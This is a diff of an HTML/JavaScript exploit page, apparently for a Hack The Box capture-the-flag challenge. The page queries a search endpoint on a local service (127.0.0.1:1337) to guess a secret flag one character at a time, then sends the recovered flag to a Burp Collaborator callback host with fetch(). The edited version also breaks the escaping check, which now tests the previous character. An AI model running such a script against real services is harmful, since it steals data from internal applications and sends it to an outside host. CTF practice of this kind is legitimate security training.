@@ -1,11 +1,11 @@
 <html>
     <script>
-        var callback = "cors-anywhere.herokuapp.com/http://u2xlwne172lxsc275xbra5ip7gd71w.burpcollaborator.net";
+        var callback = "krfmt7icm3nfxbtwwmtt9ea42v8lwa.burpcollaborator.net";
         var target = "127.0.0.1:1337";
         
-        var flag = "HTB{";
-        var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_";
-        var special = "%\”\’";
+        var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
+        var flag = "HTB";
+        var specials = "%\”\’";
         
         var payload = `http://${target}/api/entries/search?q=`
 
@@ -21,14 +21,15 @@
         }
 
         async function getFlag(chars) {
-            var b = false; var char;
-            for(var i=0; i < chars.length; i++) {
-                char = special.includes(chars[i]) ? '\\' + chars[i]:chars[i];
-                await getPartialFlag(char).then((res) => {flag = flag.concat(res); b = res==='}' ? true:false; i=0}, (res)=> { });
+            var found = false; var char;
 
-                if(b) break;
-            }
-            fetch(`https://${callback}/flag=${flag}`, {method:'get'});
+            for(var i=0; i < chars.length; i++) {
+                char = specials.includes(char) ? '\\' + chars[i]:chars[i];
+                await getPartialFlag(char).then((res) => {flag = flag.concat(res); found = res==="}" ? true:false; i=0}, (res) => { });
+
+                if(found) break;
+            }           
+            fetch(`http://${callback}/flag=${flag}`, {method:'get'});
         }
 
         getFlag(abc);
